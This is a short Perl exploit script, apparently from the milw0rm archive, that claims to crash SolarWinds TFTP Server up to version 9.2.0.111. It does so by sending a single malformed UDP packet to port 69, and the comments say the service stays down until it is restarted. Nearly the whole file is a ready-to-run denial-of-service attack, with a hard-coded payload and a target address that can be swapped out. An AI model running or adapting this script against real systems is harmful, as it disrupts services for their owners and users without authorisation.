#!/usr/bin/perl
# SolarWinds TFTP Server <=9.2.0.111 Remote DoS Exploit
# by Gaurav Baruah
# TFTP Server Service stops after payload
# is sent, and has to be started again in Config
# Tested on XP SP3
# Big thnx: dragunov
# Greetz: Sanjay

use IO::Socket;
$port = "69";
$host = "127.0.0.1";
$tftpudp = IO::Socket::INET->new(PeerPort => $port,PeerAddr => $host,Proto=> 'udp');
$boom=
"\x00\x06\x54\x9d\x68\x21\xde\x59\x30\x9a\x0b\xb5\xd4\x94\x94\x42\x3c\xeb\xc5".
"\xc1\xe8\x7d\x31\x34\xee\xd8\x60\x41\x8f\x92\x25\x9c\x5c\xcc\x78\x6a";
$tftpudp->send($boom);

# milw0rm.com [2009-08-31]
